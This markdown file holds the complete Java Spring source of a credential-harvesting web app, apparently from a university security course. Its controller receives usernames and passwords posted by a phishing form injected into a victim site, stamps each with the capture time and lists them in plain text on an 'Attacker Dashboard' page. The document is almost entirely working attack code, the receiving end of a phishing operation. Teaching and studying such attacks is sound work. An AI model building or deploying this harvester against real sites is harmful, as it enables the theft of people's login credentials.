# Source Code

This is a markdown file containing all the main parts of the source code.

## Attacker's Harvester

- java/edu/deakin/sit218/harvestcoachwebapp/Credential.java

```java
package edu.deakin.sit218.harvestcoachwebapp;

public class Credential {
    protected String username;
    protected String password;
    protected String capturedAt;

    public String getUsername() { 
    	return username; 
    }
    public void setUsername(String username) { 
    	this.username = username;
    }
    
    public String getPassword() { 
		return password; 
	}
    public void setPassword(String password) { 
		this.password = password; 
	}
    
    public String getCapturedAt() { 
    	return capturedAt; 
    }
    public void setCapturedAt(String capturedAt) { 
    	this.capturedAt = capturedAt; 
    }
}
```

- java/edu/deakin/sit218/harvestcoachwebapp/HarvestController.java

```java
package edu.deakin.sit218.harvestcoachwebapp;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

@Controller
public class HarvestController {

    // in memory store only. No database. Static so it survives across
    // requests/sessions for as long as the app is deployed.
    private static final List<Credential> harvested = new ArrayList<>();

    // attacker's dashboard: shows every submission captured so far
    @RequestMapping(value = "/dashboard", method = RequestMethod.GET)
    public String dashboard(Model model) {
        model.addAttribute("harvested", harvested);
        return "harvested";
    }

    // receives the POST from the injected phishing form on the victim app
    @RequestMapping(value = "/validate", method = RequestMethod.POST)
    public String capture(@ModelAttribute("Credential") Credential credential, Model model) {
        credential.setCapturedAt(LocalDateTime.now().toString());
        harvested.add(credential); // no validation
        model.addAttribute("harvested", harvested);
        return "harvested";
    }
}
```

- webapp/index.jsp

```jsp
<% response.sendRedirect(request.getContextPath() + "/dashboard"); %>
```


- webapp/WEB-INF/view/harvested.jsp

```jsp
<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html>
<head>
	<title>Attacker Dashboard</title>
</head>
<body>

	<h1>Harvested Credentials</h1>
	<table border="1" cellpadding="6">
	  <tr>
	  	<th>#</th>
	  	<th>Username</th>
	  	<th>Password</th>
	  	<th>Captured At</th>
	  </tr>
	  <c:forEach var="cred" items="${harvested}" varStatus="loop">
		  <tr>
		    <td>${loop.index + 1}</td>
		    <td><c:out value="${cred.username}"/></td>
		    <td><c:out value="${cred.password}"/></td>
		    <td><c:out value="${cred.capturedAt}"/></td>
		  </tr>
	  </c:forEach>
	</table>

</body>
</html>
```

